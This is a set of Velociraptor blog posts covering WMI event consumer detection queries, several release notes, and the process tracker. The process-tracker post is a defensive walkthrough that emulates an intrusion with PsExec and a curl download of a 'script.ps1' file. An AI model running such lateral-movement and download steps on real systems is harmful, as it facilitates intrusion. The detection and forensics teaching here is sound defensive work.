![WMIEventingNoismaker.ps1:Generate active script EventConsumer](04WMIEventGeneration.png)


## Collection

Velociraptor has several valuable artifacts for hunting WMI Event
Consumers:

* `Windows.Sysinternals.Autoruns` - leverages a thirdparty deployment of
Sysinternals Autoruns and typically my go to ASEP collection artifact but
limited by visibility in root/default and root/subscription only.
* `Windows.Persistence.PermanentWMIEvents` - recently upgraded to query
all ROOT namespaces.

{{% notice tip "Windows.Persistence.PermanentWMIEvents" %}}
* This artifact reports currently deployed permanent WMI Event Consumers.
* The artifact collects Binding information, then presents associated Filters and Consumers.
* Target a specific namespace, or tick `AllRootNamespaces` to collect all
root namespace event consumers.

{{% /notice %}}

![Windows.Persistence.PermanentWMIEvents: configuration options](05collection.png)

![Windows.Persistence.PermanentWMIEvents: results](05collection_results.png)


#### Telemetry

Unfortunately prior to Windows 10 WMI logging was fairly limited. Sysmon and
other telemetry sources often rely on WMI eventing itself to collect WMI
eventing telemetry events. That means custom classes require namespace and
class existence prior to telemetry subscription. Sysmon as seen below also
does not have coverage for root/default namespace.

![Sysmon collection: Event ID 20 mapping (`__EventConsumer`)](03SysmonEid20.png)

The good news is since Windows 10, WMI logging has improved significantly
and we can now query the event log: Microsoft-Windows-WMI-Activity or
subscribe the underlying ETW provider of the same name. In the VQL below
I filter the ETW event on event consumer creation or delete operations.

```vql
SELECT
    System.TimeStamp AS EventTime,
    System.ID as EventId,
    strip(prefix='\\\\\.\\',string=EventData.NamespaceName) as NamespaceName,
    EventData.Operation as Operation,
    GetProcessInfo(TargetPid=int(int=EventData.ClientProcessId))[0] as Process
FROM watch_etw(guid="{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}")
WHERE EventId = 11
    AND Operation =~ 'WbemServices::(PutInstance|DeleteInstance|PutClass|DeleteClass)'
    AND Operation =~ 'EventConsumer|EventFilter|FilterToConsumerBinding'
```

I have included a completed artifact in the artifact exchange:
[Windows.ETW.WMIEventing](https://docs.velociraptor.app/exchange/artifacts/pages/wmieventing/).
That artifact includes process enrichment, targeting both creation and deletion of EventConsumers.

![Custom namespace provider registration and process enrichment](06ETW.png)

![Windows.ETW.WMIEventing: all operations event consumer creation and removal](06ETWb.png)


#### Event Log

Similar filters can be used with ```Windows.EventLogs.EvtxHunter``` for
detection. Its worthy to note, event logs hold less verbose logging for
the registration than ETW but this use case is helpful when coming late
to the party during an investigation.

![Windows.EventLogs.EvtxHunter: hunt for event consumer string](07EvtxHunter.png)

![Windows.EventLogs.EvtxHunter: detect event consumer class creation](07EvtxHunterb.png)


# Conclusions

During this post, we have shown three techniques for detecting WMI event consumers
that are worth considering. We can collect these data-points over an entire
network in minutes using Velociraptor's "hunt" capability. Similarly
Velociraptor notebook workflow assists excluding known good entries quickly as part of analysis.

The Velociraptor platform aims to provide visibility and access
to endpoint data. If you would like to try Velociraptor it is available on Github under an open source license.
As always, please file issues on the bug tracker or ask questions on our
mailing list velociraptor-discuss@googlegroups.com. You can also chat with
us directly on discord at https://www.velocidex.com/discord


## References

1. [Microsoft documentation, About WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi)
2. [MITRE ATT&CK T1546.003, Event Triggered Execution: Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
3. [Christensen.L and Graeber.M, Blackhat 2018 - Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology](https://www.youtube.com/watch?v=R5IEyoFpZq0)
4. [JSecurity101, Windows APIs To Sysmon-Events](https://github.com/jsecurity101/Windows-API-To-Sysmon-Events/)

---END OF FILE---

======
FILE: /content/blog/2022/2022-01-05-release-notes-0.6.3/_index.md
======
---
title: "Velociraptor 0.6.3 Release"
description: |
    Our latest Velociraptor release contains many new features and bug fixes. This post outlines some of the more interesting changes.

tags:
 - Release

author: "Mike Cohen"
date: 2022-01-05
---

I am very excited to announce the latest Velociraptor release
0.6.3. This release has been in the making for a few months now and
has a lot of new features.

The main focus of development since our previous release was around
scalability and speed. Working with some of our larger partners on
scaling Velociraptor to a large number of endpoints, we have addressed
a number of challenges, which I believe have improved Velociraptor for
everyone at any level of scale!

## Performance running on EFS

Running on a distributed filesystem such as EFS presents many
advantages, not the least of which is removing the risk that disk space
will run out! Many users previously faced disk full errors when
running large hunts and accidentally collecting too much data from
endpoints! Since Velociraptor is so fast, it is easy to do a hunt
collecting a large number of files and then pretty soon the disk is
full.

Using EFS removed this risk since storage is essentially infinite (but
not free). So there is a definite advantage to running the data store
on EFS even when not running multiple frontends.  When scaling to
multiple frontends, EFS use is essential to facilitate as a shared
distributed filesystem among all the servers.

However, EFS presents some challenges. Although conceptually EFS
behaves as a transparent filesystem, in reality the added network
latency of EFS IO was causing unacceptable performance issues.

In this release we employed a number of strategies to improve
performance on EFS (and potentially other distributed filesystems
e.g. NFS). You can read all about the [new changes here]({{< ref
"/docs/deployment/server/multifrontend/" >}}), but the gist of it is
that added caching and delayed writing strategies help to isolate the
GUI performance from the underlying EFS latency, making the GUI
snappy and quick even with slow filesystems.

I encourage everyone to test the new release on an EFS backend, to
assess the performance on this setup - there are many advantages to
this configuration. While this configuration is still considered
experimental it is running successfully in a number of environments.

## Searching and indexing

More as a side effect of the EFS work, Velociraptor 0.6.3 moves the
client index into memory. This means that searching for clients by DNS
name or labels is almost instant, much improving the performance of
these operations over previous version.

VQL queries that walk over all clients, are now very fast as well. For
example the following query iterates over all clients (maybe
thousands!) and checks if their last IP came from a particular subnet:

```vql
SELECT * , split(sep=":", string=last_ip)[0] AS LastIp
FROM clients()
WHERE cidr_contains(ip=LastIp, ranges="192.168.1.0/16")
```

This query will complete in a few seconds even with a large number of
clients.

The GUI search bar can now search for IP addresses
(e.g. `ip:192.168*`), and the online only filter is much faster as a
result!

![Searching is much faster](searching.png)

Another benefit of rapid index searching is that we can now quickly
estimate how many hosts will be affected by a hunt (calculated based
on how many hosts are included and how many are excluded from the
hunt). When users have multiple label groups this helps to quickly
understand how targeted a specific hunt is.

![Estimating hunt scope](hunt.png)


## Regular expressions and Yara rules

Velociraptor artifacts are just a way of wrapping a VQL query inside a
YAML file for ease of use. Artifacts accept parameters that are passed
to the VQL itself controlling how it runs.

Velociraptor artifacts accept a number of parameters of different
types. Sometimes, they accept a windows path - for example the
`Windows.EventLogs.EvtxHunter` artifact accepts a Windows glob path
like `%SystemRoot%\System32\Winevt\Logs\*.evtx`. In the same artifact,
we also can provide a `PathRegex` which is a regular expression.

A regular expression is not the same thing as a path at all, and in
fact when users get mixed up providing something like
`C:\Windows\System32` to a regular expression field, this is an
invalid expressions - backslashes have a specific meaning in a regular
expression!

In 0.6.3 there are now dedicated GUI elements for Regular Expression
inputs. Special regex patterns such as backslash sequences are
visually distinct. Additionally the GUI verifies that the regex is
syntactically correct and offers suggestions. Users can type `?` to
receive further regular expression suggestions and help them build
their regex.

![Entering regex in the GUI](regex.png)

To receive a RegEx GUI selector in your custom artifacts, simply
denote the parameter's type as `regex`.

Similarly other artifacts require the user enter a Yara rule to use
the `yara()` VQL plugin. The Yara domain specific language (DSL) is
rather verbose so even for very simple search terms (e.g. a simple
keyword search) a full rule needs to be constructed.

To help with this task, the GUI now presents a specific Yara GUI
element. Users can press `?` to automatically fill in a skeleton Yara
rule suitable for a simple keyword match. Additionally, syntax
highlighting gives visual feedback to the validity of the yara syntax.

![Entering Yara Rules in the GUI](yara.png)

Some artifacts allow file upload as a parameter to the artifact. This
allows users to upload larger inputs for example a large Yara
rule-set. The content of the file will be made available to the VQL
running on the client transparently.

To receive a RegEx GUI selector in your custom artifacts, simply
denote the parameter's type as `yara`. To allow uploads in your
artifact parameters simply denote the parameter as a `upload`
type. Within the VQL, the content of the uploaded file will be
available as that parameter.


## Overriding Generic.Client.Info

When a new client connects to the Velociraptor server, the server
performs an `Interrogation` flow by scheduling the
`Generic.Client.Info` artifact on it. This artifact collects basic
metadata about the client such as the type of OS it is, the hostname,
the version of Velociraptor etc. This information is used to feed the
search index and is also displayed in the "VQL drilldown" page of the
`Host Information` screen.

In the latest release it is possible to customize the
`Generic.Client.Info` artifact and Velociraptor will use the
customized version instead to interrogate new clients. This allows
users to add more deployment specific collections to the interrogate
flow and customize the "VQL drilldown" page. Simply search for
`Generic.Client.Info` in the `View Artifact` screen and customize as
needed.

## Root certificates are now embedded

By default Golang searches for root certificates from the running
system so it can verify TLS connections. This behavior caused problems
when running Velociraptor on very old unpatched systems that did not
receive the latest [Let's Encrypt Root Certificate
update](https://letsencrypt.org/docs/dst-root-ca-x3-expiration-september-2021/). We
decided it was safer to just include the root certs in the binary so
we do not need to rely on the OS itself.

Additionally Velociraptor will now accept additional root certs
embedded in its config file (Just add all the certs in PEM format
under the `Client.Crypto.root_certs` key in the config file). This
helps deployments that must use a MITM proxy or traffic inspection
proxies.

{{% notice note "Traffic inspection proxy" %}}

When adding a Root Certificate to the configuration file, Velociraptor
will treat that certificate as part of the public PKI roots -
therefore you will need to have `Client.use_self_signed_ssl` as false.

This allows Velociraptor to trust the TLS connection - however, bear
in mind that Velociraptor's internal encryption channel is still
present! The MITM proxy will not be able to actually decode the data
nor can it interfere with the communications by injecting or modifying
data. Only the outer layer of TLS encryption can be stripped by the
MITM proxy.

{{% /notice %}}

## VQL Changes

### Glob plugin improvements

The `glob` plugin now has a new option: `recursion_callback`. This
allows much finer control over which directories to visit making file
searches much more efficient and targeted. To read more about it see
[Searching for files]({{< ref
"/blog/2022/2022-01-05-searching-for-files-on-linux/" >}}).

## Notable new artifacts

Many people use Velociraptor to collect and hunt for data from
endpoints. Once the data is inspected and analyzed, often the data is
no longer needed.

To help with the task of expiring old data, the latest release
incorporates the `Server.Utils.DeleteManyFlows` and
`Server.Utils.DeleteMonitoringData` artifacts which allow users to
remove older collections. This helps to manage disk usage and reduce
ongoing costs.

## Conclusions

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-11-21-release-notes/_index.md
======
---
title: "Velociraptor 0.6.7 Release"
description: |
   Velociraptor Release 0.6.7 is now LIVE. This post discusses some of the new features.

tags:
 - Release
author: "Mike Cohen"
date: 2022-11-19
---

I am very excited to announce the latest Velociraptor release 0.6.7 is
now out. This release has been in the making for a few months now and
has a lot of new features and bug fixes.

In this post I will discuss some of the interesting new features.

## NTFS Parser changes

In this release the NTFS parser was improved significantly. The main
areas of developments were around better support for NTFS compressed
and sparse files and better path reconstruction.

In NTFS there is a Master File Table (MFT) containing a record for
each file on the filesystem. The MFT entry describes a file by
attaching several attributes to the file. Some of these attributes are
`$FILE_NAME` attributes representing the file names of the file.

In NTFS a file may have multiple names. Normally, files have a long
file name and a short filename. Each `$FILE_NAME` record also contains
a reference to the parent MFT entry of its directory.

When Velociraptor parses the MFT it attempts to reconstruct the full
path of each entry by traversing the parent MFT entry, recovering its
name etc. Previously, Velociraptor used one of the `$FILE_NAME`
records (usually the long file name) to determine the parent MFT
entry. However, this is not strictly correct as each `$FILE_NAME`
record can **a different parent directory**. This surprising property
of NTFS is called **hard links**.

You can play with this property using the `fsutil` program. The
following adds a hard link to the program at
`C:/users/test/downloads/X.txt` into a different directory.

```
C:> fsutil hardlink create c:\Users\Administrator\Y.txt c:\Users\Administrator\downloads\X.txt
Hardlink created for c:\Users\Administrator\Y.txt <<===>> c:\Users\Administrator\downloads\X.txt
```

The same file in NTFS can exist in multiple directories at the same
time by use of hard links. The filesystem simply adds a new
`$FILE_NAME` entry to the MFT entry for the file pointing at another
parent directory MFT entry.

Therefore, when scanning the MFT, Velociraptor needs to report all
possible directories each MFT entry can exist in (There can be many
such directories, since each directory can have hard links itself
too).

**As a rule an MFT Entry can represent many files in different
directories!**

![An example of the notepad MFT entry with its many hard links](notepad_hardlinks.png)

## Reassembling paths from MFT entries

When Velociraptor attempts to reassemble the path from an unallocated
MFT entry it might encounter an error where the parent MFT entry
indicated has already been used for some other file or directory.

In previous versions, Velociraptor simply reported these parents as
potential parts of the full path, since for unallocated entries the
path reconstruction is best effort. This lead to confusion among users
with often nonsensical paths reported for unallocated entries.

In the latest release, Velociraptor is more strict in reporting
parents of unallocated MFT entries, also ensuring that the MFT
sequence numbers match. If the parent's MFT entry sequence number does
not match, Velociraptor's path reconstruction indicates this as an
error path.

![Unallocated MFT entries may have errors reconstructing a full path](error_path_reconstruction.png)


In the above example, the parent's MFT entry has a sequence number of
5, but we need a sequence number of 4 to match it. Therefore the
parent's MFT entry is rejected and instead we report the error as the
path.

## The offline collection and encryption

Velociraptor's offline collector is a pre-configured Velociraptor
binary which is designed to be a single shot acquisition tool. You can
build an Offline Collector by following the [documentation]({{% ref
"/docs/offline_triage/#offline-collections" %}}). The Offline
Collector does not require access to the server, instead simply
collecting the specified artifacts into a Zip file (which can
subsequently be uploaded to the cloud, or simply shared with the DFIR
experts for further analysis).

Previously, Velociraptor only supported encrypting the Zip archive
using a password. This is problematic because the password had to be
embedded inside the collector configuration and so could be viewed by
anyone with access to the binary.

In the latest release, Velociraptor supports asymmetric encryption to
protect the acquisition Zip file. There are two asymmetric schemes:
`X509 encryption` and `PGP encryption`. Having asymmetric encryption
improves security greatly because only the public key needs to be
included in the collector configuration. Dumping the configuration
from the collection is not sufficient to be able to decrypt the
collected data - the corresponding private key is also required!

This is extremely important for forensic collections since these will
often contain sensitive and PII information.

Using this new feature is also extremely easy: One simply selects the
X509 encryption scheme during the configuration of the offline
collector in the GUI.

![Configuring the offline collector for encryption](encrypting_collectors.png)

You can specify any X509 certificate here, but if you do not specify
any, Velociraptor will use the server's X509 certificate instead.

Velociraptor will generate a random password to encrypt the Zip file
with, and then encrypt this password using the X509 certificate.

![The resulting encrypted container](encrypted_container.png)

Since the ZIP standard does not encrypt the file names, Velociraptor
embed a second zip called `data.zip` inside the container. The above
illustrated the encrypted data zip file and the metadata file that
describes the encrypted password.

Because the password used to encrypt the container is not known and
needs to be derived from the X509 private key, we must use
Velociraptor itself to decrypt the container (i.e. we can not use
e.g. `7zip`).

![Decrypting encrypted containers with the server's private key](decrypting_containers.png)

## Importing offline collections

Originally the offline collector feature was designed as a way to
collect the exact same VQL artifacts that Velociraptor allows in the
usual client-server model in situations where installing the
Velociraptor client was not possible. The same artifacts can be
collected into a zip file.

As Velociraptor's post processing capabilities improved (using
notebooks and server side VQL to enrich the analysis), people
naturally wanted to use Velociraptor to post process offline
collections too.

Previously Velociraptor did have the `Server.Utils.ImportCollection`
artifact to allow an offline collection to be imported into
Velociraptor but this did not work well because the offline collector
simply did not include enough information in the Zip file to
sufficiently emulate the GUI's collection views.

In the recent release, the offline collector was updated to add more
detailed information to the collection zip, allowing it to be easily
imported.

![Exported zip archives now contain more information](container_json.png)

## Exporting and Importing collections

Velociraptor has previously had the ability to export collections and
hunts from the GUI directly, mainly so they can be processed by
external tools.

But there was no way to import those collections back into the GUI. We
just never imagined this would be a useful feature!

Recently Eric Capuano from ReconInfosec shared some data from an
exercise using Velociraptor and people wanted to import this into
their own Velociraptor installations so they can run notebook post
processing on the data themselves.

![The OpenSoc challenge https://twitter.com/eric_capuano/status/1559190056736378880 ](opensoc_challenge.png)

Our community has spoken though! This is a useful feature!

In the latest release exported files from the GUI use the same
container format as the offline collector and therefore can be
imported into a different Velociraptor installation seamlessly.

## Handling of sparse files

When collecting files from the endpoint using the NTFS accessor we
quite often encounter sparse files. These are files with large
unallocated holes in them. The most extreme sparse file is the [USN
Journal]({{% ref "/blog/2020/2020-11-13-the-windows-usn-journal-f0c55c9010e/" %}}).

![Acquiring the USN journal](the_usn_journal.png)

In the above example the USN journal size is reported to be 1.3Gb but
in reality only about 40mb is occupied on disk. When collecting this
file, Velociraptor only collects the real data and marks the file as
sparse. The Zip file will contains an index file which specifies how
to reassemble the file into its original form.

While Velociraptor stores the file internally in an efficient way,
when exporting the file for use by other tools, they might expect the
file to be properly padded out (so that file offsets are correct).

Velociraptor now allows the user the choice of exporting an individual
file in a padded form (with sparse regions padded). This can also be
applied to the entire Zip export in the GUI.

For very large sparse files, it makes no sense to pad so much data out
(Some USN journal files are in the TB region), so Velociraptor
implements a limit on padding of very sparse files.


## Parsing User Registry Hives

Many Velociraptor artifacts simply parse keys and values from the
registry to detect indicators. Velociraptor offers two methods of
accessing the registry:

1. Using the Windows APIs
2. Employing the built in raw registry parser to parse the hive files.

While the first method is very intuitive and easy to use, it is often
problematic. Using the APIs requires the user hive to be
mounted. Normally the user hive is only mounted when a user logs
in. Therefore querying registry keys in the user hive will only work
on users that are currently logged in at the time of the check and
miss other users (which are not currently logged in so their hive is
not mounted).

To illustrate this problem consider the
`Windows.Registry.Sysinternals.Eulacheck` artifact which checks the
keys in `HKEY_USERS\*\Software\Sysinternals\*` for the Sysinternals
EULA value.

In previous versions of Velociraptor, this artifact simply used the
windows API to check these keys/values and completely missed any users
that were not logged in.

While this issue is know, previously users had to employ complex VQL
to customize the query so it can search the raw `NTUSER.DAT` files in
each user registry. This is more difficult to maintain since it
requires two separate types of artifact for the same indicator.

With the advent of Velociraptor's `dead disk` capabilities it is
possible to run a VQL query in a "virtualized" context consisting of a
remapped environment. The end result is that the same VQL query can be
used to run on raw registry hives. It is now trivial to apply the same
generic registry artifact to a raw registry parse.

![Remapping the raw registry hive to a regular registry artifact](raw_registry_mapping.png)

All that is required to add raw registry capabilities to any registry artifact is:

1. Import the `Windows.Registry.NTUser` artifact
2. Use the `MapRawRegistryHives` helper function from that artifact to set up the mappings automatically.
3. Call the original registry query using the `registry` accessor. In
   the background this will be remapped to the raw registry accessor
   automatically.


## Conclusions

There are many more new features and bug fixes in the latest release.

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-08-17-process-tracker/_index.md
======
---
title: "The Velociraptor process tracker"
description: |
   Since 0.6.6, Velociraptor comes with a process tracker. What is it and how can it be used?
tags:
 - VQL
author: "Mike Cohen"
date: 2022-09-07
---

One of the advantages of running Velociraptor on the endpoint
constantly is the ability to monitor the endpoint using [client
monitoring queries]({{% ref "/docs/clients/monitoring/" %}}). Gaining
visibility to volatile information is critical to reconstructing past
activity and responding to new threats.

Commonly, attackers subvert the endpoint by creating new
processes. For example, an attacker might execute malicious office
macros as their initial compromise, but then follow it by launching
PowerShell or C# code - or commonly Living Off The Land binaries
(`LOLBins`).

We can use information about processes to identify suspicious
processes which may represent malicious activity. In the next example
I will explore a typical case and how it can be investigated using
Velociraptor.


## A Typical intrusion

A common lateral movement methodology is using `PsExec.exe` to create
a system level service (usually remotely). I will run the following commands to emulate typical attacker activities:

```
psexec.exe /s powershell
ping.exe www.google.com
curl.exe -o script.ps1 https://www.google.com/
notepad.exe
```

First I create a system level shell with `PsExec.exe`, then I perform
some reconnaissance on the network. Then I download a tool from a
remote system. Finally I run my malicious process (in this case I use
`notepad.exe` but in real life this will be some backdoor like `Cobalt
Strike`).

## Responding to this system.

For this example, suppose I was able to identify the malicious process
(`notepad.exe`) using other means (for example the
`Windows.Detection.Yara.Process` artifact by scanning process memory).

Now I need to get more context about this process:

1. Where did it come from?
2. Who started it and when?
3. What other activity was done around the time the process was started?

To answer the first question we need to see which process was the
parent of the malicious process (and construct the full call chain).

For this example I will use [Process
Hacker](https://processhacker.sourceforge.io/) - a very popular GUI
for inspecting processes.

![Process Hacker output of our suspicious process](process_hacker.png)

Normally Process Hacker displays processes in a tree form - we can see
which process spawned each process. But in this case, there is no
parent shown for `notepad.exe`. Closer inspection shows that the
parent process has actually exited, so Process Hacker has no further
information about it.

This limitation of process inspection is central to live triage - the
API can not provide any information about processes that have already
exited. Therefore, parent/child relationships are broken.

## Using Velociraptor to gather process context

Now, I will use Velociraptor's `Generic.System.Pstree` artifact to
reconstruct the process call chain of all processes on the system. I
will enable the collection of the process tree visualization.

![Collecting the Process Tree](collecting_pstree.png)

The artifact collects process call trace information from all
processes by following their parent/child relationships. I now filter
the table to just show the `notepad.exe` process, and see that the
process call tree looks very suspicious!

![Velociraptors Generic.System.Pstree artifact can clearly show the call chain](pstree.png)

Velociraptor's `Generic.System.Pstree` artifact clearly shows the full
call chain - the process was started through a `PSEXESVC.exe` service
and powershell. This additional context shines light on the initial
intrusion pathway.

## Viewing sibling processes

Launching `notepad.exe` is the final stage of a more complete attack
chain. Let's inspect the parent process in our `PsTree` collection
(`powershell.exe`) to learn what other sibling processes (to our
suspicious `notepad.exe`) were launched as part of the original attack
chain.

![Inspecting the powershell process](powershell.png)

Clicking the `Process Tree` button brings out the new Process Tree
visualization - rendering all the children of the powershell and their
respective children.

![Inspecting the full process chain of the powershell process](powershell_pstree.png)

As can be clearly seen from this visualization, Velociraptor reports
seeing the `ping.exe` process first, then the `curl.exe` process and
finally the `notepad.exe` process. You might also notice that
`curl.exe` as shown in the visualization has already exited by the
time the process tree was collected!

## How can Velociraptor show the complete process call chain?

The process call chain is very useful for us to gather some important
context but how does Velociraptor know about processes that have
already exited? After all the API will not reveal this information
which is why `Process Hacker` can not construct the full call chain?

One of the most exciting additions to Velociraptor in recent releases
was the addition of the `process tracker`. The Process tracker is an
internal tool that keeps track of processes and their children
continuously. By tracking historical process activity on the end point
we can answer questions like `Which process launched this Process ID?`
quickly, even if the original parent has already exited - we do not
need to rely on the API to gather this information.

The diagram below illustrates how the process tracker works

![The Velociraptor process tracker architecture](process_tracker.svg)

The tracker accepts process information from two potential sources:

1. An event query to feed it real time process start/end events.
2. A VQL query that runs periodically to refresh the complete state of running processes.

These are implemented by way of

1. The `Windows.Events.TrackProcesses` artifact uses ETW to watch for
   the Sysmon Process start events (ID 1) for real time information,
   as well as periodically running a complete `pslist()` to
   synchronize its internal state.

2. If you do not want to run `Sysmon`, you can choose to collect the
   `Windows.Events.TrackProcessesBasic` artifact which only refreshes
   the tracker with a periodic `pslist()` API call.

3. If you do not collect any specialized artifacts to track processes,
   the tracker will fall back to a regular pslist() based dummy
   implementation. This will give the same results as before (i.e. it
   is unable to see previously exited processes) but all process
   tracker VQL commands work as usual.

This means that as an artifact writer you can always use the process
tracker as a complete substitution to the traditional `pslist()`
plugin! Depending on how the administrator chooses to do the actual
tracking, your artifact may gain access to more details.

While it is preferable to populate the process start events with live
Sysmon events, it is not strictly necessary. Sysmon feed with provide
a more accurate real time feed of process start events. While the
alternative `pslist()` style tracking method is very low resource, it
may miss short lived processes.

## Accessing the tracker from VQL

The tracker is available for use from VQL using the following VQL
plugins:

* `process_tracker_pslist()` This plugin is a drop in replacement for
  the `pslist()` plugin. If the tracker is enabled it will also
  contain exited process information.

* `process_tracker_callchain()` provides the full call chain for a
  given process ID as an array of process entries.

* `process_tracker_get()` Looks up a single Process ID in the tracker
  to return its entry if exists.

* `process_tracker_tree()` Provides the full process tree rooted at
  the specified process ID so it can be visualized in the GUI.

## Comparing the process tracker to EDR

Collecting process call chains is very central to detection
engineering and therefore is an integral feature of many EDR
solutions.

Most EDR solutions work by relaying process start events to a central
location such as a SIEM and then using database queries to reconstruct
the process call chain from historical data. This also allows viewing
historical process information.

Velociraptor's design philosophy is endpoint-centric - rather than
forward all the data to a large backend and query across process start
events from **ALL** endpoints, Velociraptor's process tracker limits
the analysis to the process on the endpoint itself. This naturally
limits the total number of process we need to track and makes tracking
much easier because we do not need to query across the entire data set
for all clients.

## Process Tracker challenges

The following describes some of the issues in implementation of the
process tracker we have found (so far).

### Process ID reuse

While in theory process IDs uniquely identify a process, in reality
(at least on Windows) process ID's are reused aggressively. Accounting
for this is not trivial - For example, if a new process is discovered
with a parent ID of 5, we can not just search for a process with ID 5
as it's parent. Since this ID could have been reused and belong to a
completely new process.

Velociraptor's tracker keeps track of reused process ID's by using the
combination of process ID and start time to uniquely identify the
process. If the tracker detects a process has exited, it renames the
old process in the form of `pid-starttime` while creating a new
process entry in the usual form of `pid`.

![Pid reuse causes process ID's to be suffixed with their start time](pid-reuse.png)

{{% notice note "Why not use a GUID?" %}}

Other tools use a unique identifier such as a `GUID` to uniquely
identify a process. For example, `Sysmon` derives a GUID based on
process ID, start time, machine id etc to derive a globally unique
identifier to a process.

While a GUID solves the issue of uniquely identifying a process within
a single tool it is not a useful device for Velociraptor's queries,
which typically enrich data from external sources.

For example, if we used `GUID` to uniquely identify processes in the
tracker, a VQL query is unable to enrich the DNS ETW source with
process call chains. The ETW subsystem only provides a Process ID as
an indicator of the process that made the DNS query. There is no way
for Velociraptor to go from a process ID to a unique `GUID` directly
(precisely because a `PID` by itself is missing critical data that
makes it a unique identifier).

Therefore Velociraptor's tracker retains the process ID in the tracker
as the ultimate key by which we can query for a process. This way we
can always convert a PID to a proper call chain without being confused
by PID reuse. When the tracker detects the ID no longer represents the
process uniquely (i.e. the PID has been reused) the tracker can update
the ID and all references to it automatically, so a search for the
same PID will fetch the new process not the old one.

{{% /notice %}}


## What is stored in the process tracker.

The Velociraptor Process Tracker is simply a database that stores
information about each process. The process entry in the tracker can
contain any arbitrary data as populated from the process information
queries. For example, when using Sysmon as the process start source,
we can populate the tracker with quite a lot of additional information
such as executable hashes, original executable name etc.

We can choose to add additional enrichment to store in the tracker by
enabling the `AddEnrichments` parameter when configuring the
`Windows.Events.TrackProcesses` artifact. These may increase the
overall load on the endpoint (due to the additional work in
calculating hashes etc) but will provide better quality data in a
response.

![Enriching tracked process information](enrichment.png)

## Conclusions

The Process Tracker is a very exciting feature and can help resolve
incidents quickly by providing invaluable context. However it is only
useful when Velociraptor is constantly running on the endpoint. If you
usually use Velociraptor's offline collector to just collect a point
in time snapshot the process tracker will not be able to provide
information about exited processes.

If you like the new process tracker feature, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-08-15-release-notes/_index.md
======
---
title: "Velociraptor 0.6.6 Release"
description: |
   Velociraptor Release 0.6.6 is now LIVE. This post discusses some of the new features.
tags:
 - Release
author: "Mike Cohen"
date: 2022-09-07
---

I am very excited to announce the latest Velociraptor release 0.6.6 is
now out. This release has been in the making for a few months now and
has a lot of new features and bug fixes.

In this post I will discuss some of the interesting new features.

## Multi-Tenant mode

The largest improvement in the 0.6.6 release by far is the
introduction of organizational division within Velociraptor.
Velociraptor is now a fully multi-tenanted application. Each
organization is like a completely different Velociraptor installation,
with unique hunts, notebooks and clients:

1. Organizations can be created and deleted easily with no overheads.
2. Users can seamlessly switch between organizations using the GUI.
3. Operations like hunting and post processing can occur across organizations.

When looking at the latest Velociraptor GUI you might notice the
organizations selector in the `User Setting` page.

![The latest User Settings page](user_settings.png)

This allows the user to switch between the different organizations
they belong in.

### Multi-Tenanted example

Let's go through a quick example of how to create a new organization
and use them in practice.

{{% notice note "Preparing for new organizations" %}}

Multi-Tenancy is simply a layer of abstraction in the GUI separating
Velociraptor objects (such as clients, hunts, notebooks etc) into
different organizational units.

You **do not** need to do anything specific to prepare for a
multi-tenant deployment. Every Velociraptor deployment can create a
new organization at any time without affecting the current install
base at all.

By default all Velociraptor installs (including upgraded ones) have a
**root** organization which contains their current clients, hunts,
notebooks etc (You can see this in the screenshot above). If you
choose to not use the multi-tenant feature, your Velociraptor install
will continue working with the root organization without change.

{{% /notice %}}

Suppose a new customer is on-boarded but they do not have a large
enough install base to warrant a new cloud deployment (with the
associated infrastructure costs). I want to create a new organization
for this customer in the current Velociraptor deployment.

### Creating a new Organization

To create a new organization I simply run the `Server.Orgs.NewOrg`
server artifact from the `Server Artifacts` screen.

![Creating a new organization](new_org.png)

All I need to do is simply give the organization a name.

![New organization is created with a new OrgId and an Admin User](new_org_results.png)

Velociraptor uses the OrgId internally to refer to the organization
but the organization name is used in the GUI to select the different
organizations. The new organization is created with the current user
being the new administrator of this org.

### Deploying clients to the new organization.

Since all Velociraptor agents connect to the same server, there has to
be a way for the server to identify which organization each client
belongs in. This is determined by the unique `nonce` inside the
client's configuration file. Therefore each organization has a unique
client configuration that should be deployed to that organization.

I will list all the organizations on the server using the
`Server.Orgs.ListOrgs` artifact. Note that I am checking the
`AlsoDownloadConfigFiles` parameter to receive the relevant
configuration files.

![Listing all the organizations on the server](list_orgs.png)

The artifact also uploads the configuration files.

![Viewing the organizations' configuration files](list_orgs_configs.png)

Now I go through the usual deployment process with these configuration
files and prepare MSI, RPM or Deb packages as normal.

### Switching between organizations.

I can now switch between organizations using the organization selector.

![Switching between orgs](switching_orgs.png)

Now the interface is inside the new organization

![Viewing an organization](viewing_orgs.png)

Note the organization name is shown in the user tile, and client id's
have the org id appended to them to remind us that the client exists
within the org.

> The new organization is functionally equivalent to a brand new
> deployed server! It has a clean data store with new hunts, clients,
> notebooks etc. Any server artifacts will run on this organization
> only and server monitoring queries will also only apply to this
> organization.

### Adding other users to the new organization

By default, the user which created the organization is given the
administrator role within that organization. Users can be assigned
arbitrary roles **within the organization**, so for example a user may
be an administrator in one organization but a reader in another
organization.

You can add new users or change the user's roles using the
`Server.Utils.AddUser` artifact. When using basic authentication, this
artifact will create a user with a random password. The password will
then be stored in the server's metadata where it can be shared with
the user. (We normally recommend Velociraptor to be used with SSO such
